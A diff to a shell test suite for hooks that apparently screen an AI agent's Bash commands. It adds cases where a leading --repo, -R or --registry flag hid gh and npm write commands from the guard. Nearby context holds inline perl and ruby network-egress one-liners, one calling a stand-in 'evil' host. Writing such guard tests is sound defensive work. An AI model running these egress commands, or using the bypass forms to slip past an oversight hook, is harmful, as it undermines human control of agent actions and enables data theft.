@@ -209,6 +209,13 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api graphql
 # shellcheck disable=SC2016
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api graphql -f query=\"`cat q.graphql`\""}}'                     "blocks gh api graphql -f query=\"\`cat file\`\" — backtick-substitution value unreadable, fails closed (#283)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                     "allows a plain command"
+# gh's own -R/--repo global flag sits BEFORE the subcommand in gh's real usage (`gh --repo o/r api
+# ...`), so a fixed argv[1] == "api" read misses it entirely (#284).
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owner/repo api /repos/o/r -X DELETE"}}'                    "blocks a gh api write behind a leading --repo owner/repo (#284)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh -R owner/repo api /repos/o/r/issues -ftitle=x"}}'                 "blocks a gh api write behind a leading -R owner/repo (#284)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owner/repo api graphql -f query=mutation{addComment(x:1){id}}"}}' "blocks a gh api graphql mutation behind a leading --repo (#284)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owner/repo api graphql -f query=query{viewer{login}}"}}'    "allows a gh api graphql read query behind a leading --repo (#284)"
+assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owner/repo api /repos/o/r"}}'                              "allows a gh api read behind a leading --repo (#284)"
 # argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"ruby -e\"require q:net/http; Net::HTTP.get(1)\""}}'                 "blocks ruby -e glued inline egress (#126)"
@@ -556,6 +563,17 @@ assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm publish -
 assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"sudo npm publish"}}'                                          "blocks npm publish behind a sudo prefix (#242)"
 assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"echo gh pr merge 123"}}'                                      "allows a non-gh command that merely mentions pr merge (#242)"
 assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh pr view 123"}}'                                            "allows an ordinary read-only gh pr subcommand (#242)"
+
+# gh's own -R/--repo global flag sits BEFORE the subcommand in gh's real usage, so a fixed-position
+# argv[1]/argv[2] read misses it entirely (#284).
+assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owner/repo pr merge 123"}}'                          "blocks gh pr merge behind a leading --repo owner/repo (#284)"
+assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh -R owner/repo pr merge 123 --squash"}}'                     "blocks gh pr merge behind a leading -R owner/repo (#284)"
+assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh --repo=owner/repo release create v1.0.0"}}'                 "blocks gh release create behind a glued --repo= (#284)"
+assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh --repo owner/repo release create v1.0.0 --draft"}}'         "still allows --draft behind a leading --repo (#284)"
+assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"gh -R owner/repo pr view 123"}}'                               "allows an ordinary read-only gh pr subcommand behind -R (#284)"
+assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm --registry=https://registry.npmjs.org publish"}}'          "blocks npm publish behind a leading --registry= (#284)"
+assert_exit 2 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm --registry https://registry.npmjs.org publish"}}'          "blocks npm publish behind a leading separate-value --registry (#284)"
+assert_exit 0 "$BDG" '{"tool_name":"Bash","tool_input":{"command":"npm --registry=https://registry.npmjs.org publish --dry-run"}}' "allows npm publish --dry-run behind a leading --registry= (#284)"
 
 # git push straight to a GitHub-protected branch (#252) — gated on a real `gh api
 # repos/{owner}/{repo}/branches/<branch>/protection` check, not a branch-name guess. Stub `gh` on
